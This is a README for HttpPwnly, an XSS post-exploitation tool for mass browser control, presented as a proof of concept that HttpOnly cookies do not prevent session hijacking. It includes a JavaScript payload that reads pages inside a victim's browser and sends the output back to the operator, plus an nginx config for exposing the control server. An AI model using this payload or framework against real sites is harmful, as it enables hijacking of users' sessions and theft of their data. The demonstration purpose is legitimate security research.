# HttpPwnly

"Repeater" style XSS post-exploitation tool for mass browser control. Primarily a PoC to show why HttpOnly flag isn't a complete protection against session hijacking via XSS.

## Dependencies:
pip install -r requirements.txt

## Demo:
[![Demo Video](http://img.youtube.com/vi/spfrmsbhBaw/0.jpg)](https://www.youtube.com/watch?v=spfrmsbhBaw "HttpPwnly Update Demo")


## Asynchronous payloads:
To overide normal task output data within your payload (for example in order to retrieve output from XMLHttpRequest), call the "sendOutput" function and pass it your intended output. For example:

```javascript
var xmlhttp = new XMLHttpRequest();
  xmlhttp.onreadystatechange = function() {
    if (xmlhttp.readyState == 4) {
      sendOutput(id,xmlhttp.responseText);
    }
  };
xmlhttp.open("GET", "/", true);
xmlhttp.send();
```

## Reverse proxy:
HttpPwnly will bind to localhost:5000. In order to make the framework accessible remotely, the best approach is to use a reverse proxy. It's also recommended to offer HTTP as well as HTTPS, another reason to use a reverse proxy! I personally recommend using nginx for this. This is a working nginx config file:
```
server {
    listen 80;
    server_name example.com;

    location / {
        proxy_pass http://127.0.0.1:5000;
        include proxy_params;
        proxy_http_version 1.1;
        proxy_buffering off;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "Upgrade";

    }
}
server {
    listen 443 ssl;
    server_name example.com;
    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;
    location / {
        proxy_pass http://127.0.0.1:5000;
        include proxy_params;
        proxy_http_version 1.1;
        proxy_buffering off;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "Upgrade";

    }
}
```
